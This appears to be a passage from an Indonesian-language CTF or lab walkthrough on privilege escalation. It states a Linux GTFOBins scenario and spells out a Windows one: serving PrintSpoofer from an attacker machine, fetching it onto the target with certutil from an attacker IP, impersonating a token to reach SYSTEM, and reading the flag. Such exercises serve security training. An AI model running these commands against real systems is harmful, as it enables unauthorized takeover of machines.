...
Kerjakan dari shell *foothold* di target (kecuali langkah yang ditandai *di attacker*); perintah konkret tiap langkah ada di *Contoh / Payload* di bawah.
...
**Skenario A — Linux (vertical via GTFOBins).** Anda punya foothold sebagai `www-data` (semua langkah di bawah dijalankan dari shell foothold di target). Eskalasikan ke `root` dan baca `/root/root.txt`.
...
**Skenario B — Windows (vertical via token abuse).** Foothold sebagai service account IIS (shell di target). `whoami /priv` menunjukkan `SeImpersonatePrivilege` *Enabled*.

1. **Di mesin attacker**, dari folder yang berisi `PrintSpoofer64.exe`, jalankan web server: `python3 -m http.server 80` (biarkan jendela ini tetap berjalan).
2. **Di shell target**, unduh binary lewat LOLBAS `certutil` (ganti `10.10.14.5` dengan IP attacker Anda): `certutil -urlcache -split -f http://10.10.14.5/PrintSpoofer64.exe C:\Temp\PrintSpoofer64.exe` → konfirmasi file ada dengan `dir C:\Temp\PrintSpoofer64.exe`.
3. **Di shell target**, jalankan `C:\Temp\PrintSpoofer64.exe -i -c cmd.exe` → muncul shell `cmd` baru di konsol yang sama.
4. Di shell baru ketik `whoami` → hasilnya `nt authority\system`.
5. Baca flag: `type C:\Users\Administrator\Desktop\root.txt` → **isinya = flag.**
